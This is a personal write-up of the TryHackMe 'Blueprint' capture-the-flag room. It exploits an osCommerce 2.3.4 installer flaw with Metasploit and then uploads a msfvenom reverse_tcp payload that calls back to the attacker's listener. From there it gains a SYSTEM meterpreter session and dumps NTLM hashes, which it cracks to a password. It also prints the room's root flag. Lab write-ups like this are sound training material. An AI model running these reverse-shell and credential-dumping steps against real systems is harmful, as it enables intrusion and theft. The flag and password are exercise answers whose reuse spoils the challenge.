
### The port 80/443 server revealed nothing, however a visit to the 8080 port address revealed...

> ---> We can see server is using: oscommerce-2.3.4

### I used gobuster with directory-list-2.3-small.txt -> But didn't get any satisfactory result
## Then, I saw in writeup, that they used directory-list-2.3-medium.txt.

```diff
- Then I realised if after searching and enuemerating we don't get anything.

+ Again performed directory bruteforcing with directory-list-2.3-medium.txt file.

```
#### Main direcs in oscommerce-2.3.4:
```diff
+ 1. catalog/
+ 2. docs/
```
#### Main direcs in oscommerce-2.3.4/catalog:

```diff
+ 1. images/Images/IMAGES
+ 2. pub
+ 3. admin
+ 4. includes
+ 5. install/INSTALL
+ 6. ext
```
### We tranversed to admin section, but got nothing

### Then traversed to "_install_/" direc.. and pressed start button

### But it welcomed us with admin:password prompt

# 1. Manual Exploitation:
----------------------

## So,
```diff
@@ WE can now search for exploit in Searchsploit @@
```
#### I found 2 exploits --->
##### 1. 43191.py
##### 2. 44374.py

### We will now create a php reverse shell fro cmd to ***perform  RCE***.

### We executed 44374.py (after changing the ip)

# Failed:

### Refer this:

#### https://www.cybersecpadawan.com/2020/05/tryhackme-blueprint-exploitation-no.html

#### https://cd6629.gitbook.io/oscp-notes/windows-privesc/blueprint-w


# 2. Metasploit:
------------------------------------------------------
```diff
+ msf6> search oscommerce

+  0  exploit/multi/http/oscommerce_installer_unauth_code_exec  2018-04-30       excellent  Yes    osCommerce Installer Unauthenticated Code Execution
+   1  exploit/unix/webapp/oscommerce_filemanager                2009-08-31       excellent  No     osCommerce 2.2 Arbitrary PHP Code Execution

+ msf6> use 0

+ msf6> exploit(multi/http oscommerce_installer_unauth_code_exec) > show options
```
### We will use set:

> set RHOST - http://10.10.134.97/

> set RPORT - 8080

> set URI - The part of the domain which points to the /install page.
>|
>|---> oscommerce-2.3.4/catalog/INSTALL/

> set LHOST - 10.8.112.253

> set LPORT - We can leave this as 4444 (or anything else)

#### Now we perform the exploit:
```
msf6> exploit(multi/http/oscommerce_installer_unauth_code_exec) > exploit 

[*] Started reverse TCP handler on 10.8.112.253:4444 
[*] Sending stage (39282 bytes) to 10.10.134.97
[*] Meterpreter session 1 opened (10.8.112.253:4444 -> 10.10.134.97:49473) at 2021-02-10 21:57:49 +0000

meterpreter > ps
```
### I can't do anything with this shell, lagging and not giving any answer. So,

### 1. Lets create a payload with msfvenom.
### 2. Then execute it to get a shell with prevous meterpreter shell.
### 3. We will open another msf session with **multi handler** module

```diff
+ 1. msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.112.253 LPORT=5555 -f exe > shell1.exe
```
### The above payload creation was done in another shell

```diff
+ 2. meterpreter > lls
Listing Local: /home/kali/Desktop/Kali Docs/CTF/THM/Blueprint
=============================================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100644/rw-r--r--  551    fil   2021-02-10 20:04:49 +0000  ans.md
100644/rw-r--r--  1953   fil   2021-02-10 21:41:12 +0000  oscommerce_44374.py
100644/rw-r--r--  58     fil   2021-02-10 21:14:53 +0000  reverse_shell_for_cmd.php
100644/rw-r--r--  44     fil   2021-02-10 21:43:13 +0000  shell.php
100644/rw-r--r--  73802  fil   2021-02-10 22:07:41 +0000  shell.exe

+ meterpreter > upload shell.exe
[*] uploading  : /home/kali/Desktop/Kali Docs/CTF/THM/Blueprint/shell.exe -> shell.exe
[*] Uploaded -1.00 B of 72.07 KiB (-0.0%): /home/kali/Desktop/Kali Docs/CTF/THM/Blueprint/shell.exe -> shell.exe
[*] uploaded   : /home/kali/Desktop/Kali Docs/CTF/THM/Blueprint/shell.exe -> shell.exe
+ meterpreter > execute -f shell.exe
+ Process 9768 created.
```
### Now opening, another msf session with **multi handler** module
```diff
+ msf6> exploit(multi/handler) > show options 

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


+ msf6> exploit(multi/handler) > set LHOST  10.8.112.253
LHOST => 10.8.112.253
+ msf6> exploit(multi/handler) > set LPORT 5555
LPORT => 5555
+ msf6> exploit(multi/handler) > set payload windows/meterpreter/rerverse_tcp
- [-] The value specified for payload is not valid.
+ msf6> exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp

+ msf6> exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.8.112.253:5555 
[*] Sending stage (175174 bytes) to 10.10.134.97
[*] Meterpreter session 1 opened (10.8.112.253:5555 -> 10.10.134.97:49514) at 2021-02-10 22:43:09 +0000

+ meterpreter> getuid
Server username: NT AUTHORITY\SYSTEM

+ meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::

***OR***
+ meterpreter > load mimikatz
[!] The "mimikatz" extension has been replaced by "kiwi". Please use this in future.
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x86/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

+ meterpreter > help mimikatz
- [-] No such command
```
### Kiwi didn't work.

```
aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411 :::
|_______________________________| |_____________________________| |__|
               |                               |                   | 
               LM                            NT / NTLM             Mrks the end
```
### To crack the NTLM use only the 2nd last portion.

#### PASS: googleplus

### For root.txt
```
C:\Users\Administrator\Desktop>type root.txt.txt
type root.txt.txt
THM{aea1e3ce6fe7f89e10cea833ae009bee}
```
 
